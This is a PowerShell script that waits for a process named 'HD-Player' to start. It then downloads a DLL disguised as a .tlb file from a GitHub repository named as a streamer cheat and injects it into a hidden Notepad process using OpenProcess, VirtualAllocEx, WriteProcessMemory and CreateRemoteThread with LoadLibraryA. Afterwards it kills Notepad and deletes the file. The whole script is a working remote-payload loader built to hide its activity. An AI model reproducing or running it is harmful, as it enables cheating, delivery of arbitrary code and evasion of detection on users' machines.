# Constants
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
$dllPath = "C:\Windows\ShellJector.tlb"
$hdWasRunning = $false

# P/Invoke declarations
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@

while ($true) {
    $hdPlayer = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue

    if ($hdPlayer) {
        if (-not $hdWasRunning) {
            $hdWasRunning = $true

            # Download DLL (only once per HD-Player session)
            try {
                Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
            } catch {
                Start-Sleep -Milliseconds 1
                continue
            }

            # Start hidden Notepad
            $notepadProcess = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
            Start-Sleep -Milliseconds 500

            # Inject DLL
            $processId = $notepadProcess.Id
            $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)

            if ($hProcess -ne [IntPtr]::Zero) {
                $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
                $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)

                if ($allocMem -ne [IntPtr]::Zero) {
                    $outSize = [IntPtr]::Zero
                    $writeResult = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$outSize)

                    if ($writeResult) {
                        $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
                        $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")

                        if ($loadLibraryAddr -ne [IntPtr]::Zero) {
                            $threadId = [IntPtr]::Zero
                            $hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId)
                        }
                    }
                }
            }

            # Wait and clean up
            Start-Sleep -Seconds 3
            try { Stop-Process -Id $notepadProcess.Id -Force -ErrorAction SilentlyContinue } catch {}
            try { Remove-Item $dllPath -Force -ErrorAction SilentlyContinue } catch {}
        }
    } else {
        $hdWasRunning = $false
    }

    Start-Sleep -Milliseconds 1
}
